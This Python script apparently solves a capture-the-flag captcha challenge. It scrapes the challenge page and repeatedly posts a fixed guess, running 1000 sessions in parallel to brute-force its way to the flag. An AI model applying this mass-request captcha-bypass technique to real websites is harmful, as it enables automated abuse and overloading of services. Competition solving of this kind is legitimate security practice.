import asyncio
from bs4 import BeautifulSoup
import requests


first_headers = {
    'authority': 'coronacaptcha.fireshellsecurity.team',
    'pragma': 'no-cache',
    'cache-control': 'no-cache',
    'dnt': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36',
    'sec-fetch-dest': 'document',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'referer': 'https://coronacaptcha.fireshellsecurity.team/',
    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6',
}

def tryHard():
    url = 'https://coronacaptcha.fireshellsecurity.team/'
    page = requests.get(url, headers=first_headers)
    COOKIE = page.cookies

    print('tryhard')

    i = 0
    while i < 5:
        print('\t' + str(i))

        soup = BeautifulSoup(page.content, 'html.parser')

        i = int(list(soup.find_all('h2')[0].get_text())[-3])
        # print(soup.find_all('h2')[0].get_text())
        if i == 5:
            break

        myIcon = soup.find_all('strong')[0].get_text()
        DATA = {'labelIcon' : '2', 'icon' : myIcon}
        newpage = requests.post(url, headers=first_headers, cookies=COOKIE, data=DATA)
        if newpage.status_code == 200:
            page = newpage

    print('ACHEI A FLAG PORRA')
    print(page.content)


async def main():
    loop = asyncio.get_event_loop()
    futures = [
        loop.run_in_executor(
            None, 
            tryHard
        )
        for i in range(1000)
    ]
    for response in await asyncio.gather(* futures):
        pass

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
